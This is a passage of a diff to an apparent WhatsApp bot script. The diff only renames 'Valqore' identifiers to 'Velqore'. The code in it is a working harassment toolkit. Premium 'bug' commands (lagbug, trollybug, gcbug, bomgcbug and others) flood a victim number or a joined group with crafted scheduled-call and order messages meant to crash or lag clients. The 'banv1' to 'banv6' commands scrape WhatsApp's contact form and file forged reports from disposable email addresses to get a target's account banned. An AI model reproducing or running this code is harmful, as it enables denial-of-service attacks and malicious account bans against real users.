-if (!isPremium) return replygcValqore(mess.premium)
-if (!args[0]) return replygcValqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
+if (!isPremium) return replygcVelqore(mess.premium)
+if (!args[0]) return replygcVelqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
 await loading()
 victim = text.split("|")[0]+'@s.whatsapp.net'
 amount = "30"
 for (let i = 0; i < amount; i++) {
-const Valqoreybug1 = text4
+const Velqoreybug1 = text4
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
 "scheduledCallCreationMessage": {
 "callType": "2",
 "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": Valqoreybug1,
+"title": Velqoreybug1,
 }
 }), { userJid: from, quoted : m})
-ValqoreInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
+VelqoreInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
 await sleep(3000)
 }
 }
-replygcValqore(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
+replygcVelqore(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
 break
 case 'lagbug' : {
-if (!isPremium) return replygcValqore(mess.premium)
-if (!args[0]) return replygcValqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
+if (!isPremium) return replygcVelqore(mess.premium)
+if (!args[0]) return replygcVelqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
 await loading()
 victim = text.split("|")[0]+'@s.whatsapp.net'
 amount = "30"
 for (let i = 0; i < amount; i++) {
-const Valqoreybug1 = text2
+const Velqoreybug1 = text2
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
 "scheduledCallCreationMessage": {
 "callType": "2",
 "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": Valqoreybug1,
+"title": Velqoreybug1,
 }
 }), { userJid: from, quoted : m})
-ValqoreInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
+VelqoreInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
 await sleep(3000)
 }
 }
-replygcValqore(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
+replygcVelqore(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
 break
 case 'trollybug': {
-if (!isPremium) return replygcValqore(mess.premium)
-if (!args[0]) return replygcValqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
+if (!isPremium) return replygcVelqore(mess.premium)
+if (!args[0]) return replygcVelqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
 await loading()
 victim = text.split("|")[0]+'@s.whatsapp.net'
 amount = "15"
@@ -9017,127 +9013,127 @@ var order = generateWAMessageFromContent(from, proto.Message.fromObject({
 "token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
 }
 }), { userJid: from, quoted:m})
-ValqoreInc.relayMessage(victim, order.message, { messageId: order.key.id })
+VelqoreInc.relayMessage(victim, order.message, { messageId: order.key.id })
 }
-replygcValqore(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
+replygcVelqore(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
 }
 break
 case 'gcbug' : {
-if (!isPremium) return replygcValqore(mess.premium)
- if (!args[0]) return replygcValqore(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
+if (!isPremium) return replygcVelqore(mess.premium)
+ if (!args[0]) return replygcVelqore(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
 await loading()
 let result = args[0].split('https://chat.whatsapp.com/')[1]
-let Valqoregc = await ValqoreInc.groupAcceptInvite(result)
+let Velqoregc = await VelqoreInc.groupAcceptInvite(result)
 amount = "30"
 for (let i = 0; i < amount; i++) {
-const Valqoreybug1 = `${text1}`
+const Velqoreybug1 = `${text1}`
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
 "scheduledCallCreationMessage": {
 "callType": "2",
 "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": Valqoreybug1,
+"title": Velqoreybug1,
 }
 }), { userJid: from, quoted : m})
-ValqoreInc.relayMessage(Valqoregc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
+VelqoreInc.relayMessage(Velqoregc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
 await sleep(3000)
 }
-replygcValqore(`*Successfully sent Bug To ${Valqoregc} Please pause for 3 minutes*`)
+replygcVelqore(`*Successfully sent Bug To ${Velqoregc} Please pause for 3 minutes*`)
 }
 break
 case 'delaygcbug' :  {
-if (!isPremium) return replygcValqore(mess.premium)
-if (!args[0]) return replygcValqore(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
+if (!isPremium) return replygcVelqore(mess.premium)
+if (!args[0]) return replygcVelqore(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
 await loading()
 let result = args[0].split('https://chat.whatsapp.com/')[1]
-let Valqoregc = await ValqoreInc.groupAcceptInvite(result)
+let Velqoregc = await VelqoreInc.groupAcceptInvite(result)
 amount = "30"
 for (let i = 0; i < amount; i++) {
-const Valqoreybug1 = text5
+const Velqoreybug1 = text5
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
 "scheduledCallCreationMessage": {
 "callType": "2",
 "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": Valqoreybug1,
+"title": Velqoreybug1,
 }
 }), { userJid: from, quoted : m})
-ValqoreInc.relayMessage(Valqoregc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
+VelqoreInc.relayMessage(Velqoregc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
 await sleep(3000)
 }
-replygcValqore(`*Successfully sent Bug To ${Valqoregc} Please pause for 3 minutes*`)
+replygcVelqore(`*Successfully sent Bug To ${Velqoregc} Please pause for 3 minutes*`)
 }
 break
 case 'laggcbug' :  {
-if (!isPremium) return replygcValqore(mess.premium)
-if (!args[0]) return replygcValqore(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
+if (!isPremium) return replygcVelqore(mess.premium)
+if (!args[0]) return replygcVelqore(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
 await loading()
 let result = args[0].split('https://chat.whatsapp.com/')[1]
-let Valqoregc = await ValqoreInc.groupAcceptInvite(result)
+let Velqoregc = await VelqoreInc.groupAcceptInvite(result)
 amount = "30"
 for (let i = 0; i < amount; i++) {
-const Valqoreybug1 = text2
+const Velqoreybug1 = text2
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
 "scheduledCallCreationMessage": {
 "callType": "2",
 "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": Valqoreybug1,
+"title": Velqoreybug1,
 }
 }), { userJid: from, quoted : m})
-ValqoreInc.relayMessage(Valqoregc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
+VelqoreInc.relayMessage(Velqoregc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
 await sleep(3000)
 }
-replygcValqore(`*Successfully sent Bug To ${Valqoregc} Please pause for 3 minutes*`)
+replygcVelqore(`*Successfully sent Bug To ${Velqoregc} Please pause for 3 minutes*`)
 }
 break
 case 'bomgcbug' :  {
-if (!isPremium) return replygcValqore(mess.premium)
-if (!args[0]) return replygcValqore(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
+if (!isPremium) return replygcVelqore(mess.premium)
+if (!args[0]) return replygcVelqore(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
 await loading()
 let result = args[0].split('https://chat.whatsapp.com/')[1]
-let Valqoregc = await haikal.groupAcceptInvite(result)
+let Velqoregc = await haikal.groupAcceptInvite(result)
 amount = "30"
 for (let i = 0; i < amount; i++) {
-const Valqoreybug1 = text4
+const Velqoreybug1 = text4
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
 "scheduledCallCreationMessage": {
 "callType": "2",
 "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": Valqoreybug1,
+"title": Velqoreybug1,
 }
 }), { userJid: from, quoted : m})
-ValqoreInc.relayMessage(Valqoregc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
+VelqoreInc.relayMessage(Velqoregc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
 await sleep(3000)
 }
-replygcValqore(`*Successfully sent Bug To ${Valqoregc} Please pause for 3 minutes*`)
+replygcVelqore(`*Successfully sent Bug To ${Velqoregc} Please pause for 3 minutes*`)
 }
 break
 case 'unlimitedgcbug' :  {
-if (!isPremium) return replygcValqore(mess.premium)
-if (!args[0]) return replygcValqore(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
+if (!isPremium) return replygcVelqore(mess.premium)
+if (!args[0]) return replygcVelqore(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
 await loading()
 let result = args[0].split('https://chat.whatsapp.com/')[1]
-let Valqoregc = await ValqoreInc.groupAcceptInvite(result)
+let Velqoregc = await VelqoreInc.groupAcceptInvite(result)
 amount = "30"
 for (let i = 0; i < amount; i++) {
-const Valqoreybug1 = text3
+const Velqoreybug1 = text3
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
 "scheduledCallCreationMessage": {
 "callType": "2",
 "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": Valqoreybug1,
+"title": Velqoreybug1,
 }
 }), { userJid: from, quoted : m})
-ValqoreInc.relayMessage(Valqoregc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
+VelqoreInc.relayMessage(Velqoregc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
 await sleep(3000)
 }
-replygcValqore(`*Successfully sent Bug To ${Valqoregc} Please pause for 3 minutes*`)
+replygcVelqore(`*Successfully sent Bug To ${Velqoregc} Please pause for 3 minutes*`)
 }
 break
 case 'trollygcbug' :  {
-if (!isPremium) return replygcValqore(mess.premium)
-if (!args[0]) return replygcValqore(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
+if (!isPremium) return replygcVelqore(mess.premium)
+if (!args[0]) return replygcVelqore(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
 await loading()
 let result = args[0].split('https://chat.whatsapp.com/')[1]
-let Valqoregc = await ValqoreInc.groupAcceptInvite(result)
+let Velqoregc = await VelqoreInc.groupAcceptInvite(result)
 amount = "15"
 for (let i = 0; i < amount; i++) {
 var order = generateWAMessageFromContent(from, proto.Message.fromObject({
@@ -9153,47 +9149,47 @@ var order = generateWAMessageFromContent(from, proto.Message.fromObject({
 "token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
 }
 }), { userJid: from, quoted:m})
-ValqoreInc.relayMessage(Valqoregc, order.message, { messageId: order.key.id })
+VelqoreInc.relayMessage(Velqoregc, order.message, { messageId: order.key.id })
 }
-replygcValqore(`*Successfully sent Bug To ${Valqoregc} Please pause for 3 minutes*`)
+replygcVelqore(`*Successfully sent Bug To ${Velqoregc} Please pause for 3 minutes*`)
 }
 break
 case 'docugcbug' :  {
-if (!isPremium) return replygcValqore(mess.premium)
-if (!args[0]) return replygcValqore(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
+if (!isPremium) return replygcVelqore(mess.premium)
+if (!args[0]) return replygcVelqore(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
 await loading()
 let result = args[0].split('https://chat.whatsapp.com/')[1]
-let Valqoregc = await ValqoreInc.groupAcceptInvite(result)
+let Velqoregc = await VelqoreInc.groupAcceptInvite(result)
 amount = "15"
 for (let i = 0; i < amount; i++) {
-const Valqoreybug1 = `${text1}`
+const Velqoreybug1 = `${text1}`
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
 "scheduledCallCreationMessage": {
 "callType": "2",
 "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": Valqoreybug1,
+"title": Velqoreybug1,
 }
 }), { userJid: from, quoted : m})
-ValqoreInc.relayMessage(Valqoregc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
+VelqoreInc.relayMessage(Velqoregc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
 await sleep(3000)
 }
-replygcValqore(`*Successfully sent Bug To ${Valqoregc} Please pause for 3 minutes*`)
+replygcVelqore(`*Successfully sent Bug To ${Velqoregc} Please pause for 3 minutes*`)
 } 
 break
 
 //ban/unban cases
 case 'out': case 'verif':{
 if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcValqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
-let Valqorenumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let Valqoretesx = await ValqoreInc.onWhatsApp(Valqorenumx)
-if (Valqoretesx.length == 0) return replygcValqore(`Enter a valid and registered number on WhatsApp!!!`)
+if (!args[0]) return replygcVelqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
+let Velqorenumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
+let Velqoretesx = await VelqoreInc.onWhatsApp(Velqorenumx)
+if (Velqoretesx.length == 0) return replygcVelqore(`Enter a valid and registered number on WhatsApp!!!`)
 let axioss = require("axios")  
-let Valqorexos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
+let Velqorexos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
 let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = Valqorexos.headers["set-cookie"].join("; ")
+let cookie = Velqorexos.headers["set-cookie"].join("; ")
 const cheerio = require('cheerio');
-let $ = cheerio.load(Valqorexos.data)
+let $ = cheerio.load(Velqorexos.data)
 let $form = $("form");
 let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
 let form = new URLSearchParams()
@@ -9201,7 +9197,7 @@ form.append("jazoest", $form.find("input[name=jazoest]").val())
 form.append("lsd", $form.find("input[name=lsd]").val())
 form.append("step", "submit")
 form.append("country_selector", "INDIA")
-form.append("phone_number", Valqorenumx)
+form.append("phone_number", Velqorenumx)
 form.append("email", email.data[0])
 form.append("email_confirm", email.data[0])
 form.append("platform", "ANDROID")
@@ -9223,21 +9219,21 @@ let res = await axioss({
   cookie
 }
 })
-ValqoreInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
+VelqoreInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
 }
 break
 case 'banv1': {
 if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcValqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
-let Valqorenumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let Valqoretesx = await ValqoreInc.onWhatsApp(Valqorenumx)
-if (Valqoretesx.length == 0) return replygcValqore(`Enter a valid and registered number on WhatsApp!!!`)
+if (!args[0]) return replygcVelqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
+let Velqorenumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
+let Velqoretesx = await VelqoreInc.onWhatsApp(Velqorenumx)
+if (Velqoretesx.length == 0) return replygcVelqore(`Enter a valid and registered number on WhatsApp!!!`)
 let axioss = require("axios")  
-let Valqorexos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
+let Velqorexos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
 let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = Valqorexos.headers["set-cookie"].join("; ")
+let cookie = Velqorexos.headers["set-cookie"].join("; ")
 const cheerio = require('cheerio');
-let $ = cheerio.load(Valqorexos.data)
+let $ = cheerio.load(Velqorexos.data)
 let $form = $("form");
 let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
 let form = new URLSearchParams()
@@ -9245,7 +9241,7 @@ form.append("jazoest", $form.find("input[name=jazoest]").val())
 form.append("lsd", $form.find("input[name=lsd]").val())
 form.append("step", "submit")
 form.append("country_selector", "INDIA")
-form.append("phone_number", Valqorenumx)
+form.append("phone_number", Velqorenumx)
 form.append("email", email.data[0])
 form.append("email_confirm", email.data[0])
 form.append("platform", "ANDROID")
@@ -9267,21 +9263,21 @@ let res = await axioss({
   cookie
 }
 })
-ValqoreInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
+VelqoreInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
 }
 break
 case 'banv2': {
 if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcValqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
-let Valqorenumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let Valqoretesx = await ValqoreInc.onWhatsApp(Valqorenumx)
-if (Valqoretesx.length == 0) return replygcValqore(`Enter a valid and registered number on WhatsApp!!!`)
+if (!args[0]) return replygcVelqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
+let Velqorenumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
+let Velqoretesx = await VelqoreInc.onWhatsApp(Velqorenumx)
+if (Velqoretesx.length == 0) return replygcVelqore(`Enter a valid and registered number on WhatsApp!!!`)
 let axioss = require("axios")  
-let Valqorexos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
+let Velqorexos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
 let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = Valqorexos.headers["set-cookie"].join("; ")
+let cookie = Velqorexos.headers["set-cookie"].join("; ")
 const cheerio = require('cheerio');
-let $ = cheerio.load(Valqorexos.data)
+let $ = cheerio.load(Velqorexos.data)
 let $form = $("form");
 let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
 let form = new URLSearchParams()
@@ -9289,7 +9285,7 @@ form.append("jazoest", $form.find("input[name=jazoest]").val())
 form.append("lsd", $form.find("input[name=lsd]").val())
 form.append("step", "submit")
 form.append("country_selector", "INDIA")
-form.append("phone_number", Valqorenumx)
+form.append("phone_number", Velqorenumx)
 form.append("email", email.data[0])
 form.append("email_confirm", email.data[0])
 form.append("platform", "ANDROID")
@@ -9311,21 +9307,21 @@ let res = await axioss({
   cookie
 }
 })
-ValqoreInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
+VelqoreInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
 }
 break
 case 'banv3': {
 if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcValqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
-let Valqorenumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let Valqoretesx = await ValqoreInc.onWhatsApp(Valqorenumx)
-if (Valqoretesx.length == 0) return replygcValqore(`Enter a valid and registered number on WhatsApp!!!`)
+if (!args[0]) return replygcVelqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
+let Velqorenumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
+let Velqoretesx = await VelqoreInc.onWhatsApp(Velqorenumx)
+if (Velqoretesx.length == 0) return replygcVelqore(`Enter a valid and registered number on WhatsApp!!!`)
 let axioss = require("axios")  
-let Valqorexos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
+let Velqorexos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
 let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = Valqorexos.headers["set-cookie"].join("; ")
+let cookie = Velqorexos.headers["set-cookie"].join("; ")
 const cheerio = require('cheerio');
-let $ = cheerio.load(Valqorexos.data)
+let $ = cheerio.load(Velqorexos.data)
 let $form = $("form");
 let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
 let form = new URLSearchParams()
@@ -9333,7 +9329,7 @@ form.append("jazoest", $form.find("input[name=jazoest]").val())
 form.append("lsd", $form.find("input[name=lsd]").val())
 form.append("step", "submit")
 form.append("country_selector", "INDIA")
-form.append("phone_number", Valqorenumx)
+form.append("phone_number", Velqorenumx)
 form.append("email", email.data[0])
 form.append("email_confirm", email.data[0])
 form.append("platform", "ANDROID")
@@ -9355,21 +9351,21 @@ let res = await axioss({
   cookie
 }
 })
-ValqoreInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
+VelqoreInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
 }
 break
 case 'banv4': {
 if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcValqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
-let Valqorenumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let Valqoretesx = await ValqoreInc.onWhatsApp(Valqorenumx)
-if (Valqoretesx.length == 0) return replygcValqore(`Enter a valid and registered number on WhatsApp!!!`)
+if (!args[0]) return replygcVelqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
+let Velqorenumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
+let Velqoretesx = await VelqoreInc.onWhatsApp(Velqorenumx)
+if (Velqoretesx.length == 0) return replygcVelqore(`Enter a valid and registered number on WhatsApp!!!`)
 let axioss = require("axios")  
-let Valqorexos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
+let Velqorexos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
 let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = Valqorexos.headers["set-cookie"].join("; ")
+let cookie = Velqorexos.headers["set-cookie"].join("; ")
 const cheerio = require('cheerio');
-let $ = cheerio.load(Valqorexos.data)
+let $ = cheerio.load(Velqorexos.data)
 let $form = $("form");
 let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
 let form = new URLSearchParams()
@@ -9377,7 +9373,7 @@ form.append("jazoest", $form.find("input[name=jazoest]").val())
 form.append("lsd", $form.find("input[name=lsd]").val())
 form.append("step", "submit")
 form.append("country_selector", "INDIA")
-form.append("phone_number", Valqorenumx)
+form.append("phone_number", Velqorenumx)
 form.append("email", email.data[0])
 form.append("email_confirm", email.data[0])
 form.append("platform", "ANDROID")
@@ -9399,21 +9395,21 @@ let res = await axioss({
   cookie
 }
 })
-ValqoreInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
+VelqoreInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
 }
 break
 case 'banv5': {
 if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcValqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
-Valqorenumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let Valqoretesx = await ValqoreInc.onWhatsApp(Valqorenumx)
-if (Valqoretesx.length == 0) return replygcValqore(`Enter a valid and registered number on WhatsApp!!!`)
+if (!args[0]) return replygcVelqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
+Velqorenumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
+let Velqoretesx = await VelqoreInc.onWhatsApp(Velqorenumx)
+if (Velqoretesx.length == 0) return replygcVelqore(`Enter a valid and registered number on WhatsApp!!!`)
 let axioss = require("axios")  
-let Valqorexos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
+let Velqorexos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
 let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = Valqorexos.headers["set-cookie"].join("; ")
+let cookie = Velqorexos.headers["set-cookie"].join("; ")
 const cheerio = require('cheerio');
-let $ = cheerio.load(Valqorexos.data)
+let $ = cheerio.load(Velqorexos.data)
 let $form = $("form");
 let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
 let form = new URLSearchParams()
@@ -9421,7 +9417,7 @@ form.append("jazoest", $form.find("input[name=jazoest]").val())
 form.append("lsd", $form.find("input[name=lsd]").val())
 form.append("step", "submit")
 form.append("country_selector", "INDIA")
-form.append("phone_number", Valqorenumx)
+form.append("phone_number", Velqorenumx)
 form.append("email", email.data[0])
 form.append("email_confirm", email.data[0])
 form.append("platform", "ANDROID")
@@ -9443,21 +9439,21 @@ let res = await axioss({
   cookie
 }
 })
-ValqoreInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
+VelqoreInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
 }
 break
 case 'banv6': {
 if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcValqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
-let Valqorenumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let Valqoretesx = await ValqoreInc.onWhatsApp(Valqorenumx)
-if (Valqoretesx.length == 0) return replygcValqore(`Enter a valid and registered number on WhatsApp!!!`)
+if (!args[0]) return replygcVelqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
+let Velqorenumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
+let Velqoretesx = await VelqoreInc.onWhatsApp(Velqorenumx)
+if (Velqoretesx.length == 0) return replygcVelqore(`Enter a valid and registered number on WhatsApp!!!`)
 let axioss = require("axios")  
-let Valqorexos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
+let Velqorexos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
 let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = Valqorexos.headers["set-cookie"].join("; ")
+let cookie = Velqorexos.headers["set-cookie"].join("; ")
 const cheerio = require('cheerio');
-let $ = cheerio.load(Valqorexos.data)
+let $ = cheerio.load(Velqorexos.data)
 let $form = $("form");
 let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
 let form = new URLSearchParams()
@@ -9465,7 +9461,7 @@ form.append("jazoest", $form.find("input[name=jazoest]").val())
 form.append("lsd", $form.find("input[name=lsd]").val())
 form.append("step", "submit")
 form.append("country_selector", "INDIA")
-form.append("phone_number", Valqorenumx)
+form.append("phone_number", Velqorenumx)
 form.append("email", email.data[0])
 form.append("email_confirm", email.data[0])
 form.append("platform", "ANDROID")
@@ -9487,21 +9483,21 @@ let res = await axioss({
   cookie
 }
 })
-ValqoreInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
+VelqoreInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
 }
 break
 case 'unbanv1': {
 if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcValqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
-let Valqorenumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let Valqoretesx = await ValqoreInc.onWhatsApp(Valqorenumx)
-if (Valqoretesx.length == 0) return replygcValqore(`Enter a valid and registered number on WhatsApp!!!`)
+if (!args[0]) return replygcVelqore(`Use ${prefix+command} number\nExample ${prefix+command} 918130784851`)
+let Velqorenumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
+let Velqoretesx = await VelqoreInc.onWhatsApp(Velqorenumx)
+if (Velqoretesx.length == 0) return replygcVelqore(`Enter a valid and registered number on WhatsApp!!!`)
 let axioss = require("axios")  
-let Valqorexos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
+let Velqorexos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
 let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = Valqorexos.headers["set-cookie"].join("; ")
+let cookie = Velqorexos.headers["set-cookie"].join("; ")
 const cheerio = require('cheerio');
-let $ = cheerio.load(Valqorexos.data)
+let $ = cheerio.load(Velqorexos.data)
 let $form = $("form");
 let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
 let form = new URLSearchParams()
@@ -9509,7 +9505,7 @@ form.append("jazoest", $form.find("input[name=jazoest]").val())
 form.append("lsd", $form.find("input[name=lsd]").val())
 form.append("step", "submit")
 form.append("country_selector", "INDIA")
-form.append("phone_number", Valqorenumx)
+form.append("phone_number", Velqorenumx)
 form.append("email", email.data[0])
 form.append("email_confirm", email.data[0])
 form.append("platform", "ANDROID")
@@ -9531,21 +9527,21 @@ let res = await axioss({
   cookie
 }
 })
-ValqoreInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
+VelqoreInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
 }
 break
 case 'unbanv2': {
